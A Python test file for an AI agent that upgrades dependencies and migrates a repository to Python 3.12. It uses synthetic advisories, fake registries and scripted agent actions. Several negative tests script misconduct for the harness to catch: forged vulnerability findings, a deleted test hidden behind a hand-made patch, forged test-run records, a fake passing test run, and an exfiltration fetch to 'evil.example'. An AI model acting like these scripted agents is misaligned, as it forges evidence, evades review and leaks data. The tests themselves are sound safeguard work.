"""
tests/specialists/test_upgrade_migration_e2e.py - the upgrade-migration
specialist end to end: Specialist.run_milestone with a ScriptedAdapter drives
the kit's loop, policy and the real domain tools over a git repository
seeded from evals/fixtures, then the acceptance checks run and the
Submission is hashed.

Offline: OSV and the package registries are answered from the fixtures by a
fake HTTP transport. git runs for real. The client's test command gets a
pytest-style summary counted from the repo's test functions, because the
synthetic fixture imports invented packages and cannot run for real.
"""
from __future__ import annotations

import csv
import hashlib
import io
import json
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

from agentkit.events import MemorySink
from agentkit.evals import load_cases, prepare_workspace
from agentkit.evidence import evidence_hash
from agentkit.llm import ScriptedAdapter
from agentkit.policy import executable_name
from agentkit.registry import load_specialist
from agentkit.specialist import RunContext
from agentkit.tools.base import subprocess_runner
from agentkit.types import Brief, Submission
from specialists.upgrade_migration import tools as T

FIXTURES = Path(T.__file__).parent / "evals" / "fixtures"
ADVISORIES = json.loads((FIXTURES / "osv-advisories.json").read_text(encoding="utf-8"))
# Release dates the fake registries report (old enough for the 7-day rule).
RELEASES = {
    ("PyPI", "quillhttp"): {"1.8.2": "2024-03-01T00:00:00Z", "1.9.1": "2025-06-01T00:00:00Z"},
    ("npm", "left-trim-lite"): {"1.1.0": "2024-01-10T00:00:00.000Z", "1.2.5": "2025-05-20T00:00:00.000Z"},
}
PYTEST = ["python", "-m", "pytest", "-q"]
GIT_ID = ["-c", "user.name=Test Engineer", "-c", "user.email=engineer@example.invalid",
          "-c", "commit.gpgsign=false"]

M1 = "deliverables/m1-assess"
M2 = "deliverables/m2-upgrade"
M3 = "deliverables/m3-migrate"


# --- fakes -------------------------------------------------------------------------

class FakeNet:
    """The ToolContext transport: OSV and the PyPI / npm registries."""

    def __init__(self, advisories=ADVISORIES):
        self.records = {a["id"]: a for a in advisories}
        self.calls: list[tuple[str, str]] = []

    @staticmethod
    def _json(data, status=200):
        return status, {"Content-Type": "application/json"}, json.dumps(data).encode("utf-8")

    def __call__(self, method, url, headers, body, timeout):
        self.calls.append((method, url))
        if url == f"{T.OSV_API}/querybatch":
            results = []
            for q in json.loads(body)["queries"]:
                eco, name = q["package"]["ecosystem"], q["package"]["name"]
                ids = [{"id": vid} for vid, rec in self.records.items()
                       if T.is_affected(rec, eco, name, q["version"])]
                results.append({"vulns": ids} if ids else {})
            return self._json({"results": results})
        if url.startswith(f"{T.OSV_API}/vulns/"):
            rec = self.records.get(url.rsplit("/", 1)[1])
            return self._json(rec) if rec else self._json({}, 404)
        m = re.fullmatch(r"https://pypi\.org/pypi/([^/]+)/json", url)
        if m and ("PyPI", m.group(1)) in RELEASES:
            rel = RELEASES[("PyPI", m.group(1))]
            return self._json({"info": {"version": max(rel, key=T.version_key)},
                               "releases": {v: [{"upload_time_iso_8601": t}] for v, t in rel.items()}})
        m = re.fullmatch(r"https://registry\.npmjs\.org/([^/]+)", url)
        if m and ("npm", m.group(1)) in RELEASES:
            rel = RELEASES[("npm", m.group(1))]
            return self._json({"dist-tags": {"latest": max(rel, key=T.version_key)}, "time": rel,
                               "versions": {v: {} for v in rel}})
        return 404, {}, b"not found"


class FakeRunner:
    """The ToolContext subprocess seam: git and `python -c` run for real; the
    test command reports one pass per test function in repo/tests (a
    skip-marked test counts as skipped). `fail` makes one git subcommand
    fail."""

    def __init__(self, fail: str | None = None):
        self.calls: list[list[str]] = []
        self.fail = fail

    def __call__(self, argv, cwd, timeout, env):
        self.calls.append([executable_name(argv[0]), *argv[1:]])
        if executable_name(argv[0]) == "git" and argv[1:2] == [self.fail]:
            return 128, b"", f"fatal: simulated {self.fail} failure".encode(), False
        if executable_name(argv[0]) == "git" or [executable_name(argv[0]), *argv[1:2]] == ["python", "-c"]:
            return subprocess_runner(argv, cwd, timeout, env)
        if [executable_name(argv[0]), *argv[1:3]] == ["python", "-m", "pytest"]:
            passed = skipped = 0
            for f in sorted((Path(cwd) / "tests").rglob("test_*.py")):
                for m in re.finditer(r"((?:^@.*\n)*)^def test_", f.read_text(encoding="utf-8"), re.M):
                    if "skip" in m.group(1) or "xfail" in m.group(1):
                        skipped += 1
                    else:
                        passed += 1
            tail = f", {skipped} skipped" if skipped else ""
            return 0, f"{'.' * passed}\n{passed} passed{tail} in 0.04s\n".encode(), b"", False
        return 127, b"", f"unexpected command: {argv}".encode(), False


# --- workspace ---------------------------------------------------------------------------

def git(repo: Path, *args: str) -> str:
    return subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True, text=True).stdout


def make_workspace(tmp_path: Path) -> Path:
    """The fixture repo as a git repository with one commit (LF endings)."""
    ws = tmp_path / "ws"
    src = FIXTURES / "ledgerly-api" / "repo"
    for f in sorted(p for p in src.rglob("*") if p.is_file()):
        dest = ws / "repo" / f.relative_to(src)
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(f.read_bytes().replace(b"\r\n", b"\n"))
    repo = ws / "repo"
    git(repo, "init", "-q")
    git(repo, "config", "core.autocrlf", "false")
    git(repo, "add", "--all")
    git(repo, *GIT_ID, "commit", "-q", "-m", "ledgerly-api as checked out")
    return ws


@pytest.fixture
def spec(monkeypatch):
    # "python" is allowlisted by name; make sure a python is on PATH (the
    # fake runner answers for it, so which one does not matter).
    monkeypatch.setenv("PATH", os.path.dirname(sys.executable) + os.pathsep + os.environ.get("PATH", ""))
    return load_specialist("upgrade-migration")


def _brief() -> Brief:
    return Brief(engagement_id="eng-um-1", specialist="upgrade-migration",
                 objective="Clear known vulnerabilities in ledgerly-api and move it to Python 3.12 APIs.",
                 intake={"repository": "ledgerly-api (main)", "test_command": "python -m pytest -q",
                         "targets": "Fix known vulnerabilities; run on Python 3.12",
                         "upgrade_policy": "No majors without approval; 7-day release age"})


def run(spec, ws, milestone, plan, *, events=None, net=None, runner=None):
    adapter = ScriptedAdapter.from_tool_plan(plan)
    ctx = RunContext(brief=_brief(), workspace=ws, adapter=adapter, events=events or MemorySink(),
                     transport=net or FakeNet(), runner=runner or FakeRunner())
    return spec.run_milestone(ctx, milestone), adapter


def results(sub: Submission) -> dict:
    return {r.check: r for r in sub.check_results}


def failing(sub: Submission) -> list:
    return [(r.check, r.details) for r in sub.check_results if r.kind == "automated" and r.passed is not True]


def assert_ready(spec, ws, sub: Submission, milestone: str) -> None:
    assert sub.status == "ready_for_review", failing(sub)
    for r in sub.check_results:
        if r.check == "rubric_grader":
            assert r.kind == "rubric" and r.passed is None        # no grader configured
        elif r.check == "human_signoff":
            assert r.kind == "human" and r.passed is None
        else:
            assert r.kind == "automated" and r.passed is True, (r.check, r.details)
    m = spec.manifest.milestone(milestone)
    assert [a.path for a in sub.artifacts] == m.deliverables
    for a in sub.artifacts:
        assert a.sha256 == hashlib.sha256((ws / a.path).read_bytes()).hexdigest()
    gate = spec.manifest.human_gate
    assert sub.human_review.required is gate.required is False
    assert sub.human_review.checklist == gate.checklist
    assert re.fullmatch(r"0x[0-9a-f]{64}", sub.evidence_hash)
    saved = json.loads(spec.submission_path(ws, milestone).read_text(encoding="utf-8"))
    assert evidence_hash(Submission.from_dict(saved)) == sub.evidence_hash == saved["evidence_hash"]


def tool_errors(events: MemorySink) -> list:
    return [(e.data["name"], e.data["content"][:300]) for e in events.of_type("tool_result")
            if e.data["is_error"]]


# --- scripted milestones -------------------------------------------------------------------------

PLAN_MD = """# Upgrade plan: ledgerly-api

## Summary
Four advisories affect pinned dependencies. SYN-2026-0003 (yamlette 5.0, CRITICAL) has no fixed
release. SYN-2026-0001 (quillhttp 1.8.2, HIGH) and SYN-2026-0004 (left-trim-lite 1.1.0, MEDIUM)
are fixed by minor bumps. SYN-2026-0002 (tabulon 3.1.0, MEDIUM) is fixed only in 4.0.0, a major.

## Inventory
Python runtime and dev pins come from requirements.txt and requirements-dev.txt; the web client
pins come from web/package-lock.json. See inventory.json.

## Findings
| advisory | package | version | severity | fixed in |
|---|---|---|---|---|
| SYN-2026-0003 | yamlette | 5.0 | CRITICAL | none |
| SYN-2026-0001 | quillhttp | 1.8.2 | HIGH | 1.9.1 |
| SYN-2026-0004 | left-trim-lite | 1.1.0 | MEDIUM | 1.2.5 |
| SYN-2026-0002 | tabulon | 3.1.0 | MEDIUM | 4.0.0 |

## Upgrade steps
1. quillhttp 1.8.2 -> 1.9.1 (minor), full suite after the step.
2. left-trim-lite 1.1.0 -> 1.2.5 (minor), full suite after the step.

## Migration rules
- `from collections import Mapping` -> `from collections.abc import Mapping`
- `datetime.utcnow()` -> `datetime.now(timezone.utc)`
- `quillhttp.get_legacy(` -> `quillhttp.get(`

## Risks
The quillhttp minor release changes redirect handling; fetch_rates is the only caller.

## Exceptions
- SYN-2026-0003: no fixed yamlette release; proposed exception pending the client's approval.
- SYN-2026-0002: needs the tabulon 4.0 major; proposed deferral pending the client's approval.

## Questions
Should the tabulon 4.0 major be part of this engagement? Recommendation: defer it.
"""

REPORT_MD = """# Upgrade report: ledgerly-api

## Summary
Two advisories resolved (SYN-2026-0001, SYN-2026-0004); SYN-2026-0002 and SYN-2026-0003 stay open.

## Steps
| step | package | from | to | test run |
|---|---|---|---|---|
| 1 | quillhttp | 1.8.2 | 1.9.1 | run-2 (green) |
| 2 | left-trim-lite | 1.1.0 | 1.2.5 | run-3 (green) |

## Vulnerability delta
Baseline: 4 open advisories. Now: 2 open (tabulon, yamlette).

## Code changes
Pins only: requirements.txt, web/package.json and web/package-lock.json.

## New dependencies
None.

## Follow-ups
Decide on the tabulon 4.0 major; track yamlette for a fixed release.
"""

MIGRATION_MD = """# Migration report: ledgerly-api on Python 3.12

## Summary
Every retired API the migration rules name is gone from app/; the suite stays green.

## What changed
- app/invoices.py: collections.abc import, timezone-aware timestamps, quillhttp.get.
- pyproject.toml: requires-python >=3.12.

## Verification
All three detectors went from 1 match each to 0; the suite passed with 3 tests.

## Residual risk
SYN-2026-0002 (tabulon) is deferred and SYN-2026-0003 (yamlette) has no fix; both await the
client's decision in residual-risk.csv.

## Rollback
Revert the patch; no data or schema changes are involved.

## Follow-ups
CI still pins an older Python; update the workflow after this patch is merged.
"""

DETECTORS = [
    {"id": "collections-abc-alias", "regex": r"from collections import .*\bMapping\b", "glob": "*.py"},
    {"id": "datetime-utcnow", "regex": r"datetime\.utcnow\(", "glob": "*.py"},
    {"id": "quillhttp-get-legacy", "regex": r"quillhttp\.get_legacy\(", "glob": "*.py"},
]


def residual_csv() -> str:
    out = io.StringIO()
    w = csv.writer(out, lineterminator="\n")
    w.writerow(["vuln_id", "package", "status", "justification", "review_by"])
    w.writerow(["SYN-2026-0002", "tabulon", "deferred",
                "Fix needs the tabulon 4.0 major, which the client deferred", "2026-12-31"])
    w.writerow(["SYN-2026-0003", "yamlette", "no_fix_available",
                "No fixed release exists; only bundled config files are loaded", "2026-12-31"])
    return out.getvalue()


def m1_plan(findings_step=None):
    findings_step = findings_step or ("plan_upgrades", {"findings_csv": f"{M1}/findings.csv",
                                                        "output": f"{M1}/plan.json"})
    return [
        ("inventory_dependencies", {"output": f"{M1}/inventory.json"}),
        ("osv_scan", {}),
        findings_step,
        ("write_file", {"path": f"{M1}/upgrade-plan.md", "content": PLAN_MD}),
        ("submit_milestone", {"summary": "Inventory, OSV findings and upgrade plan",
                              "artifacts": [f"{M1}/{n}" for n in
                                            ("inventory.json", "findings.csv", "plan.json", "upgrade-plan.md")]}),
    ]


UPGRADE_LOG = {"steps": [
    {"ecosystem": "PyPI", "name": "quillhttp", "from": "1.8.2", "to": "1.9.1", "test_run": "run-2"},
    {"ecosystem": "npm", "name": "left-trim-lite", "from": "1.1.0", "to": "1.2.5", "test_run": "run-3"},
]}


def m2_plan():
    return [
        ("run_tests", {"argv": PYTEST, "label": "baseline"}),
        [("package_versions", {"ecosystem": "PyPI", "name": "quillhttp"}),
         ("package_versions", {"ecosystem": "npm", "name": "left-trim-lite"})],
        ("edit_file", {"path": "repo/requirements.txt", "old_text": "quillhttp==1.8.2",
                       "new_text": "quillhttp==1.9.1"}),
        ("run_tests", {"argv": PYTEST, "label": "step-1 quillhttp 1.9.1"}),
        [("edit_file", {"path": "repo/web/package-lock.json", "old_text": '"version": "1.1.0"',
                        "new_text": '"version": "1.2.5"'}),
         ("edit_file", {"path": "repo/web/package.json", "old_text": '"^1.1.0"', "new_text": '"^1.2.5"'})],
        ("run_tests", {"argv": PYTEST, "label": "step-2 left-trim-lite 1.2.5"}),
        ("osv_scan", {}),
        ("write_file", {"path": f"{M2}/upgrade-log.json", "content": json.dumps(UPGRADE_LOG, indent=2)}),
        ("export_patch", {"output": f"{M2}/repo.patch"}),
        ("audit_diff", {"patch": f"{M2}/repo.patch", "forbid": [".github/*"]}),
        ("write_file", {"path": f"{M2}/report.md", "content": REPORT_MD}),
        ("run_command", {"argv": ["git", *GIT_ID, "commit", "-q", "-am", "Upgrade quillhttp and left-trim-lite"],
                         "cwd": "repo"}),
        ("submit_milestone", {"summary": "Two upgrades, each with a green run",
                              "artifacts": [f"{M2}/repo.patch", f"{M2}/upgrade-log.json", f"{M2}/report.md"]}),
    ]


def m3_plan():
    edit = "repo/app/invoices.py"
    return [
        ("scan_patterns", {"detectors": DETECTORS}),
        ("edit_file", {"path": edit, "old_text": "from collections import Mapping\nfrom datetime import datetime\n",
                       "new_text": "from collections.abc import Mapping\nfrom datetime import datetime, timezone\n"}),
        [("edit_file", {"path": edit, "old_text": "datetime.utcnow()", "new_text": "datetime.now(timezone.utc)"}),
         ("edit_file", {"path": edit, "old_text": "quillhttp.get_legacy(", "new_text": "quillhttp.get("}),
         ("edit_file", {"path": "repo/pyproject.toml", "old_text": 'requires-python = ">=3.9"',
                        "new_text": 'requires-python = ">=3.12"'})],
        ("scan_patterns", {"detectors": DETECTORS}),
        ("run_tests", {"argv": PYTEST, "label": "m3 migrated"}),
        [("write_file", {"path": f"{M3}/detectors.json", "content": json.dumps(DETECTORS, indent=2)}),
         ("write_file", {"path": f"{M3}/residual-risk.csv", "content": residual_csv()}),
         ("write_file", {"path": f"{M3}/migration-report.md", "content": MIGRATION_MD})],
        ("export_patch", {"output": f"{M3}/repo.patch"}),
        ("submit_milestone", {"summary": "Python 3.12 migration; detectors at zero",
                              "artifacts": [f"{M3}/{n}" for n in ("repo.patch", "detectors.json",
                                                                  "residual-risk.csv", "migration-report.md")]}),
    ]


# --- happy path ------------------------------------------------------------------------------

def test_specialist_is_wired(spec):
    assert type(spec).__name__ == "UpgradeMigration"
    assert spec.validate() == []
    checks = spec.check_registry()
    assert checks.kind("tests_pass") == checks.kind("findings_match_osv") == "automated"
    assert {d["name"] for d in T.TOOL_DEFS} <= set(spec.tool_registry().names())


def test_engagement_end_to_end(spec, tmp_path):
    ws = make_workspace(tmp_path)
    net = FakeNet()

    # m1: read-only assessment
    events = MemorySink()
    sub, adapter = run(spec, ws, "m1-assess", m1_plan(), events=events, net=net)
    assert not tool_errors(events)
    assert_ready(spec, ws, sub, "m1-assess")
    assert {"SYN-2026-0001", "SYN-2026-0002", "SYN-2026-0003", "SYN-2026-0004"} <= \
        {url.rsplit("/", 1)[1] for _, url in net.calls}
    assert git(ws / "repo", "status", "--porcelain") == ""            # nothing changed
    first = adapter.calls[0]
    assert "export_patch" in first["tools"] and "Dependency Upgrade" in first["system"]
    assert "python -m pytest -q" in first["messages"][0]["text"]       # intake reaches the task

    # m2: upgrades in small steps, patch regenerated from git
    base = git(ws / "repo", "rev-parse", "HEAD").strip()
    events = MemorySink()
    sub, _ = run(spec, ws, "m2-upgrade", m2_plan(), events=events, net=net)
    assert not tool_errors(events)
    assert_ready(spec, ws, sub, "m2-upgrade")
    assert results(sub)["osv_delta"].details.startswith("baseline 4 open, now 2; resolved 2")
    patch = (ws / M2 / "repo.patch").read_text(encoding="utf-8")
    assert {f["path"] for f in T.parse_unified_diff(patch)} == \
        {"requirements.txt", "web/package.json", "web/package-lock.json"}
    assert "+quillhttp==1.9.1" in patch
    exported = events.of_type("patch_exported")[0].data
    assert exported["base"] == base and exported["paths"] == [f"{M2}/repo.patch"]
    assert git(ws / "repo", "rev-parse", "HEAD").strip() != base      # the model committed locally

    # m3: migration against the commit m2 left, residual risk registered
    events = MemorySink()
    sub, _ = run(spec, ws, "m3-migrate", m3_plan(), events=events, net=net)
    assert not tool_errors(events)
    assert_ready(spec, ws, sub, "m3-migrate")
    patch = (ws / M3 / "repo.patch").read_text(encoding="utf-8")
    assert {f["path"] for f in T.parse_unified_diff(patch)} == {"app/invoices.py", "pyproject.toml"}
    assert results(sub)["detectors_cleared"].details == "3 detectors at zero"


def test_plain_copy_gets_a_git_baseline(spec, tmp_path):
    """An eval-style workspace (the fixture copied, no git history) still
    gets a base commit, so patches can be exported."""
    case = next(c for c in load_cases(spec) if c.milestone == "m1-assess")
    ws = tmp_path / "eval"
    prepare_workspace(spec, case, ws)
    assert not (ws / "repo" / ".git").exists()
    sub, _ = run(spec, ws, "m1-assess", m1_plan())
    assert_ready(spec, ws, sub, "m1-assess")
    assert (ws / "repo" / ".git").is_dir()
    assert git(ws / "repo", "log", "--format=%s").strip() == "agentkit: repo/ as received"
    assert spec.base_commit(ws, "m1-assess") == git(ws / "repo", "rev-parse", "HEAD").strip()


# --- negative paths ------------------------------------------------------------------------------

def test_forged_findings_need_revision(spec, tmp_path):
    """A hand-written findings.csv that downplays a severity and drops an
    advisory disagrees with the recorded OSV evidence."""
    rows = [",".join(T.FINDINGS_COLUMNS),
            "PyPI,quillhttp,1.8.2,SYN-2026-0001,CVE-2099-10001,HIGH,7.5,1.9.1,True,False,x",
            "PyPI,tabulon,3.1.0,SYN-2026-0002,CVE-2099-10002,MEDIUM,,4.0.0,True,False,x",
            "PyPI,yamlette,5.0,SYN-2026-0003,CVE-2099-10003,LOW,9.8,,True,False,x"]
    forged = [("plan_upgrades", {"output": f"{M1}/plan.json"}),
              ("write_file", {"path": f"{M1}/findings.csv", "content": "\n".join(rows) + "\n"})]
    ws = make_workspace(tmp_path)
    sub, _ = run(spec, ws, "m1-assess", m1_plan(findings_step=forged))
    assert sub.status == "needs_revision"
    res = results(sub)["findings_match_osv"]
    assert res.passed is False
    assert "SYN-2026-0004" in res.details and "SYN-2026-0003 (LOW != CRITICAL)" in res.details
    assert results(sub)["inventory_matches_repo"].passed is True     # the rest still checks out


def test_hand_written_patch_cannot_hide_a_deleted_test(spec, tmp_path):
    """The model deletes a test and submits a patch that only shows the
    version bump. finalize replaces it with the real diff, so diff_scope
    sees the deletion, and tests_pass sees fewer passing tests."""
    ws = make_workspace(tmp_path)
    assert run(spec, ws, "m1-assess", m1_plan())[0].status == "ready_for_review"
    clean = ("diff --git a/requirements.txt b/requirements.txt\n--- a/requirements.txt\n"
             "+++ b/requirements.txt\n@@ -1,4 +1,4 @@\n # runtime\n-quillhttp==1.8.2\n"
             "+quillhttp==1.9.1\n tabulon==3.1.0\n yamlette==5.0\n")
    plan = [
        ("run_tests", {"argv": PYTEST, "label": "baseline"}),
        ("package_versions", {"ecosystem": "PyPI", "name": "quillhttp"}),
        [("edit_file", {"path": "repo/requirements.txt", "old_text": "quillhttp==1.8.2",
                        "new_text": "quillhttp==1.9.1"}),
         ("edit_file", {"path": "repo/tests/test_invoices.py",
                        "old_text": "def test_is_record():\n    assert is_record({\"a\": 1}) and not is_record([1])\n",
                        "new_text": ""})],
        ("run_tests", {"argv": PYTEST, "label": "step-1"}),
        ("osv_scan", {}),
        [("write_file", {"path": f"{M2}/repo.patch", "content": clean}),
         ("write_file", {"path": f"{M2}/upgrade-log.json", "content": json.dumps({"steps": [
             {"ecosystem": "PyPI", "name": "quillhttp", "from": "1.8.2", "to": "1.9.1", "test_run": "run-2"}]})}),
         ("write_file", {"path": f"{M2}/report.md", "content": REPORT_MD})],
        ("submit_milestone", {"summary": "quillhttp upgraded",
                              "artifacts": [f"{M2}/repo.patch", f"{M2}/upgrade-log.json", f"{M2}/report.md"]}),
    ]
    sub, _ = run(spec, ws, "m2-upgrade", plan)
    assert sub.status == "needs_revision"
    res = results(sub)
    assert res["diff_scope"].passed is False and "1 test definitions removed" in res["diff_scope"].details
    assert res["tests_pass"].passed is False and "2 tests pass now, 3 passed in run-1" in res["tests_pass"].details
    patch = (ws / M2 / "repo.patch").read_text(encoding="utf-8")
    assert patch != clean and "-def test_is_record():" in patch
    patch_artifact = next(a for a in sub.artifacts if a.path == f"{M2}/repo.patch")
    assert patch_artifact.sha256 == hashlib.sha256(patch.encode("utf-8")).hexdigest()


def test_model_cannot_forge_evidence_or_leave_the_policy(spec, tmp_path):
    ws = make_workspace(tmp_path)
    events = MemorySink()
    net = FakeNet()
    runner = FakeRunner()
    forged_run = json.dumps({"id": "run-1", "exit_code": 0, "counts": {"passed": 99, "failed": 0}})
    plan = [
        ("inventory_dependencies", {"path": "repo/web"}),                    # exploratory, not a baseline
        ("write_file", {"path": f"{T.STATE_DIR}/test_runs.jsonl", "content": forged_run}),
        ("inventory_dependencies", {"output": f"{T.STATE_DIR}/baseline.json"}),
        ("plan_upgrades", {"findings_csv": "inputs/findings.csv"}),
        ("run_command", {"argv": ["curl", "https://api.osv.dev/v1/vulns/SYN-2026-0001"]}),
        ("http_fetch", {"url": "https://evil.example/exfil"}),
        "Stopping here.", "Still stopping.",
    ]
    sub, _ = run(spec, ws, "m2-upgrade", plan, events=events, net=net, runner=runner)
    assert sub.status == "incomplete"
    assert len(events.of_type("policy_denied")) == 5
    assert not (ws / T.STATE_DIR / "test_runs.jsonl").exists() and not (ws / "inputs").exists()
    baseline = json.loads((ws / T.STATE_DIR / "baseline.json").read_text(encoding="utf-8"))
    assert baseline["path"] == "repo" and "recorded_at" in baseline       # prepare's record of all repo/
    assert {"quillhttp", "left-trim-lite"} <= {d["name"] for d in baseline["dependencies"]}
    assert net.calls == [] and not any(c[0] == "curl" for c in runner.calls)


@pytest.mark.parametrize("command,ok", [
    ("python -m pytest -q", True), (["npm", "test"], True), ("go test ./...", True),
    ("make test", False), ("cd services/api && pytest", False), ("DJANGO_SETTINGS_MODULE=x pytest", False),
    ("pytest | tee out.txt", False), ("npx jest", False), ("pytest 'unbalanced", False),
])
def test_intake_rejects_test_commands_the_checks_cannot_run(spec, command, ok):
    """tests_pass runs the client's command as one argv through the shell
    allowlist; a command it could never run is sent back at scoping."""
    intake = {"repository": "r", "targets": "t", "test_command": command}
    missing = [m for m in spec.validate_intake(intake) if m.field == "test_command"]
    assert (missing == []) is ok, missing
    if not ok:
        assert missing[0].blocking and "single command" in missing[0].question


def test_patch_export_failure_fails_closed(spec, tmp_path):
    """If git cannot produce the diff, the model's own repo.patch is not
    audited in its place: it is deleted and patch_generated fails."""
    ws = make_workspace(tmp_path)
    assert run(spec, ws, "m1-assess", m1_plan())[0].status == "ready_for_review"
    clean = ("diff --git a/requirements.txt b/requirements.txt\n--- a/requirements.txt\n"
             "+++ b/requirements.txt\n@@ -1,4 +1,4 @@\n # runtime\n-quillhttp==1.8.2\n"
             "+quillhttp==1.9.1\n tabulon==3.1.0\n yamlette==5.0\n")
    plan = [p for p in m2_plan() if not (isinstance(p, tuple) and p[0] in ("export_patch", "audit_diff"))]
    plan.insert(-1, ("write_file", {"path": f"{M2}/repo.patch", "content": clean}))
    events = MemorySink()
    sub, _ = run(spec, ws, "m2-upgrade", plan, events=events, runner=FakeRunner(fail="diff"))
    assert sub.status == "needs_revision"
    res = results(sub)
    assert res["patch_generated"].passed is False and "simulated diff failure" in res["patch_generated"].details
    assert res["diff_scope"].passed is False and not (ws / M2 / "repo.patch").exists()
    assert f"{M2}/repo.patch" not in [a.path for a in sub.artifacts]
    assert any("repo.patch not exported" in e.data["message"] for e in events.of_type("warning"))


def test_upgrade_log_needs_client_runs_that_tested_each_step(spec, tmp_path):
    """Both upgrades applied at once, a `python -c` run printing a pytest
    summary cited for step 1, a real run cited for step 2: the log fails;
    everything else about the milestone checks out."""
    ws = make_workspace(tmp_path)
    assert run(spec, ws, "m1-assess", m1_plan())[0].status == "ready_for_review"
    fake_green = ["python", "-c", "print('12 passed in 0.01s')"]
    plan = [
        ("run_tests", {"argv": PYTEST, "label": "baseline"}),                          # run-1
        [("package_versions", {"ecosystem": "PyPI", "name": "quillhttp"}),
         ("package_versions", {"ecosystem": "npm", "name": "left-trim-lite"})],
        [("edit_file", {"path": "repo/requirements.txt", "old_text": "quillhttp==1.8.2",
                        "new_text": "quillhttp==1.9.1"}),
         ("edit_file", {"path": "repo/web/package-lock.json", "old_text": '"version": "1.1.0"',
                        "new_text": '"version": "1.2.5"'})],                          # both at once
        ("run_tests", {"argv": fake_green, "label": "step-1 quillhttp 1.9.1"}),        # run-2
        ("run_tests", {"argv": PYTEST, "label": "step-2 left-trim-lite 1.2.5"}),       # run-3
        ("osv_scan", {}),
        [("write_file", {"path": f"{M2}/upgrade-log.json", "content": json.dumps(UPGRADE_LOG)}),
         ("write_file", {"path": f"{M2}/report.md", "content": REPORT_MD}),
         ("export_patch", {"output": f"{M2}/repo.patch"})],
        ("submit_milestone", {"summary": "Two upgrades",
                              "artifacts": [f"{M2}/repo.patch", f"{M2}/upgrade-log.json", f"{M2}/report.md"]}),
    ]
    events = MemorySink()
    sub, _ = run(spec, ws, "m2-upgrade", plan, events=events)
    assert not tool_errors(events)
    assert sub.status == "needs_revision"
    assert [c for c, _ in failing(sub)] == ["upgrade_log_verified"]
    details = results(sub)["upgrade_log_verified"].details
    assert "step 1: run-2 is not the client's test command" in details
    assert "step 1: run-2 did not test the logged state" in details
    runs = T.load_test_runs(ws)
    assert runs[1]["argv"] == fake_green and runs[1]["counts"]["passed"] == 12   # it did "pass"
